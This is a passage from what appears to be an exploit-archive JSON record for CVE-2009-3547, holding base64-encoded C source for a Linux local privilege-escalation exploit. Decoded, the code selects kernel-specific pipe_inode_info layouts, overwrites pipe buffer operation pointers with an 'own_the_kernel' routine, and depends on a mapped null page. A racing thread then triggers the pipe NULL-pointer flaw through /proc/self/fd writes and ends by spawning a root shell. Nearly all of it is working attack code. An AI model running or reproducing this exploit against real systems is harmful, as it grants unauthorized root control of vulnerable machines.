AzOw0KCX0gZWxzZSBpZiAoc3RybGVuKHVubS5yZWxlYXNlKSA+PSA2ICYmIHVubS5yZWxlYXNlWzJdID09ICc2JyAmJiB1bm0ucmVsZWFzZVs0XSA+PSAnMScgJiYgdW5tLnJlbGVhc2VbNV0gPj0gJzcnICYmIHVubS5yZWxlYXNlWzVdIDw9ICc5Jykgew0KCQlmcHJpbnRmKHN0ZG91dCwgIiBbK10gVXNpbmcgb2xkZXIgcGlwZV9pbm9kZV9pbmZvIGxheW91dFxuIik7DQoJCW5ld3ZlciA9IDI7DQoJfSBlbHNlIGlmIChzdHJsZW4odW5tLnJlbGVhc2UpID49IDUgJiYgdW5tLnJlbGVhc2VbMl0gPT0gJzYnKSB7DQoJCWZwcmludGYoc3Rkb3V0LCAiIFsrXSBVc2luZyBvbGRlci1lciBwaXBlX2lub2RlX2luZm8gbGF5b3V0XG4iKTsNCgkJbmV3dmVyID0gMTsNCi8vCX0gZWxzZSBpZiAoc3RybGVuKHVubS5yZWxlYXNlKSA+PSA1ICYmIHVubS5yZWxlYXNlWzJdID49ICc0Jykgew0KLy8JCWlzX29sZF9rZXJuZWwgPSAxOw0KLy8JCW5ld3ZlciA9IDA7DQoJfSBlbHNlIHsNCgkJZnByaW50ZihzdGRvdXQsICIgWytdIFRoaXMga2VybmVsIGlzIHN0aWxsIHZ1bG5lcmFibGUsIGJ1dCBJIGNhbid0IGJlIGJvdGhlcmVkIHRvIHdyaXRlIHRoZSBleHBsb2l0LiAgV3JpdGUgaXQgeW91cnNlbGYuXG4iKTsNCgkJZXhpdCgxKTsNCgl9DQoNCgkvKiBmb3IgbW9zdCBvZiB0aGVzZSB3aGF0IHdpbGwgaGFwcGVuIGlzIG91ciB3cml0ZSB3aWxsDQoJICAgY2F1c2Ugb3BzLT5jb25maXJtKC9waW4pIHRvIGJlIGNhbGxlZCwgd2hpY2ggd2UndmUgcmVwbGFjZWQNCgkgICB3aXRoIG93bl90aGVfa2VybmVsDQoJICAgZm9yIHRoZSAyLjYuMTAtPjIuNi4xNiBjYXNlIGl0IGhhcyBubyBjb25maXJtL3BpbiBvcCwgc28gd2hhdCBnZXRzDQoJICAgY2FsbGVkIGluc3RlYWQgKHJlcGVhdGVkbHkpIGlzIHRoZSByZWxlYXNlIG9wDQoJKi8NCglpZiAobmV3dmVyID09IDMpIHsNCgkJLyogdW5jb21tZW50IGZvciBERUJVR19TUElOTE9DSyAqLw0KCQkvL2luZm9fbmV3LT5tYWdpYyA9IDB4ZGVhZDRlYWQ7DQoJCS8qIG1ha2VzIGxpc3RfaGVhZCBlbXB0eSBmb3Igd2FrZV91cF9jb21tb24gKi8NCgkJaW5mb19uZXctPm5leHQgPSAmaW5mb19uZXctPm5leHQ7DQoJCWluZm9fbmV3LT5yZWFkZXJzID0gMTsNCgkJaW5mb19uZXctPndyaXRlcnMgPSAxOw0KCQlpbmZvX25ldy0+bnJidWZzID0gMTsNCgkJaW5mb19uZXctPmN1cmJ1ZiA9IDE7DQoJCWZvciAoaSA9IDA7IGkgPCBQSVBFX0JVRkZFUlM7IGkrKykNCgkJCWluZm9fbmV3LT5idWZzW2ldLm9wcyA9ICh2b2lkICopb3BzOw0KCX0gZWxzZSBpZiAobmV3dmVyID09IDIpIHsNCgkJLyogdW5jb21tZW50IGZvciBERUJVR19TUElOTE9DSyAqLw0KCQkvL2luZm9fb2xkLT5tYWdpYyA9IDB4ZGVhZDRlYWQ7DQoJCS8qIG1ha2VzIGxpc3RfaGVhZCBlbXB0eSBmb3Igd2FrZV91cF9jb21tb24gKi8NCgkJaW5mb19vbGQtPm5leHQgPSAmaW5mb19vbGQtPm5leHQ7DQoJCWluZm9fb2xkLT5yZWFkZXJzID0gMTsNCgkJaW5mb19vbGQtPndyaXRlcnMgPSAxOw0KCQlpbmZvX29sZC0+bnJidWZzID0gMTsNCgkJaW5mb19vbGQtPmN1cmJ1ZiA9IDE7DQoJCWZvciAoaSA9IDA7IGkgPCBQSVBFX0JVRkZFUlM7IGkrKykNCgkJCWluZm9fb2xkLT5idWZzW2ldLm9wcyA9ICh2b2lkICopb3BzOw0KCX0gZWxzZSBpZiAobmV3dmVyID09IDEpIHsNCgkJLyogdW5jb21tZW50IGZvciBERUJVR19TUElOTE9DSyAqLw0KCQkvL2luZm9fb2xkZXItPm1hZ2ljID0gMHhkZWFkNGVhZDsNCgkJLyogbWFrZXMgbGlzdF9oZWFkIGVtcHR5IGZvciB3YWtlX3VwX2NvbW1vbiAqLw0KCQlpbmZvX29sZGVyLT5uZXh0ID0gJmluZm9fb2xkZXItPm5leHQ7DQoJCWluZm9fb2xkZXItPnJlYWRlcnMgPSAxOw0KCQlpbmZvX29sZGVyLT53cml0ZXJzID0gMTsNCgkJaW5mb19vbGRlci0+bnJidWZzID0gMTsNCgkJaW5mb19vbGRlci0+Y3VyYnVmID0gMTsNCgkJLyogd2UnbGwgZ2V0IGNhbGxlZCBtdWx0aXBsZSB0aW1lcyBmcm9tIGZyZWVfcGlwZV9pbmZvDQoJCSAgIGJ1dCBpdCdzIG9rIGJlY2F1c2Ugb3duX3RoZV9rZXJuZWwgaGFuZGxlcyB0aGlzIGNhc2UNCgkJKi8NCgkJZm9yIChpID0gMDsgaSA8IFBJUEVfQlVGRkVSUzsgaSsrKQ0KCQkJaW5mb19vbGRlci0+YnVmc1tpXS5vcHMgPSAodm9pZCAqKW9wczsNCgl9IGVsc2Ugew0KCQkvKg0KCQlkaWZmZXJlbnQgYmFsbGdhbWUgaGVyZSwgaW5zdGVhZCBvZiBiZWluZyBhYmxlIHRvIA0KCQlwcm92aWRlIGEgZnVuY3Rpb24gcG9pbnRlciBpbiB0aGUgb3BzIHRhYmxlLCB5b3UgDQoJCWNvbnRyb2wgYSBiYXNlIGFkZHJlc3MgdXNlZCB0byBjb21wdXRlIHRoZSBhZGRyZXNzIGZvciANCgkJYSBjb3B5IGludG8gdGhlIGtlcm5lbCB2aWEgY29weV9mcm9tX3VzZXIuICBUaGUgDQoJCWZvbGxvd2luZyBzaG91bGQgZ2V0IHlvdSBzdGFydGVkLg0KCQkqLw0KCQkvKiBsb29rdXAgc3ltYm9sIGZvciB3cml0YWJsZSBmcHRyIHRoZW4gdHJpZ2dlciBpdCBsYXRlcg0KCQkgICBjaGFuZ2UgdGhlIG1haW4gd3JpdGUgaW4gdGhlIG9uZSB0aHJlYWQgdG8gd3JpdGUgb3V0IA0KCQkgICBwb2ludGVycyB3aXRoIHRoZSB2YWx1ZSBvZiBleHBfc3RhdGUtPmV4cGxvaXRfa2VybmVsDQoJCSovDQoJCWluZm9fb2xkZXN0LT5iYXNlID0gKGNoYXIgKikweGM4MDAwMDAwOw0KCQlpbmZvX29sZGVzdC0+cmVhZGVycyA9IDE7DQoJCWluZm9fb2xkZXN0LT53cml0ZXJzID0gMTsNCgkJcmV0dXJuIDA7DQoJfQ0KDQoJb3BzLT5jYW5fbWVyZ2UgPSAxOw0KCWZvciAoaSA9IDA7IGkgPCAxNjsgaSsrKQ0KCQkoKHZvaWQgKiopJm9wcy0+bWFwKVtpXSA9IGV4cF9zdGF0ZS0+b3duX3RoZV9rZXJuZWw7DQoNCglyZXR1cm4gMDsNCn0NCg0KaW50IHJlcXVpcmVzX251bGxfcGFnZSA9IDE7DQoNCmludCBnZXRfZXhwbG9pdF9zdGF0ZV9wdHIoc3RydWN0IGV4cGxvaXRfc3RhdGUgKnB0cikNCnsNCglleHBfc3RhdGUgPSBwdHI7DQoJcmV0dXJuIDA7DQp9DQoNCmludCB0cmlnZ2VyKHZvaWQpDQp7DQogICAgICAgIGNoYXIgYnVmWzEyOF07DQogICAgICAgIGludCBmZDsNCglpbnQgaSA9IDA7DQoNCgkvKiBpZ25vcmUgc2lncGlwZSBzbyB3ZSBkb24ndCBiYWlsIG91dCBlYXJseSAqLw0KCXNpZ25hbChTSUdQSVBFLCBTSUdfSUdOKTsNCg0KCXN0YXJ0X3RocmVhZChnb19nb19zcGVlZF9yYWNlciwgTlVMTCk7DQoNCglmcHJpbnRmKHN0ZG91dCwgIiBbK10gV2UnbGwgbGV0IHRoaXMgZ28gZm9yIGEgd2hpbGUgaWYgbmVlZGVkLi4uXG4iKTsNCglmZmx1c2goc3Rkb3V0KTsNCg0KICAgICAgICB3aGlsZSAoIWV4cF9zdGF0ZS0+Z290X3JpbmcwICYmIGkgPCAxMDAwMDAwMCkgew0KCQlmZCA9IHBpcGVmZFsxXTsNCgkJc3ByaW50ZihidWYsICIvcHJvYy9zZWxmL2ZkLyVkIiwgZmQpOw0KCQlmZCA9IG9wZW4oYnVmLCBPX1dST05MWSB8IE9fTk9OQkxPQ0spOw0KCQlpZiAoZmQgPj0gMCkgew0KCQkJLyogYnVzdCBzcGlubG9jayAqLw0KCQkJKih1bnNpZ25lZCBpbnQgKilOVUxMID0gaXNfb2xkX2tlcm5lbCA/IDAgOiAxOw0KCQkJd3JpdGUoZmQsICIuIiwgMSk7DQoJCQljbG9zZShmZCk7DQoJCX0NCgkJaSsrOw0KICAgICAgICB9DQoNCglpZiAoIWV4cF9zdGF0ZS0+Z290X3JpbmcwKSB7DQoJCWZwcmludGYoc3Rkb3V0LCAiIFsrXSBGYWlsZWQgdG8gdHJpZ2dlciB0aGUgdnVsbmVyYWJpbGl0eS4gIElzIHRoaXMgYSBzaW5nbGUgcHJvY2Vzc29yIG1hY2hpbmUgd2l0aCBDT05GSUdfUFJFRU1QVF9OT05FPXk/XG4iKTsNCgkJcmV0dXJuIDA7DQoJfQ0KDQoJcmV0dXJuIDE7DQp9DQoNCmludCBwb3N0KHZvaWQpDQp7DQovLwlyZXR1cm4gUlVOX1JPT1RTSEVMTDsNCglyZXR1cm4gRlVOTllfUElDX0FORF9ST09UU0hFTEw7DQp9", 
    "filename": "platforms/linux/local/40812.c", 
    "id": "40812", 
    "cves": [
        "CVE-2009-3547"
    ]
}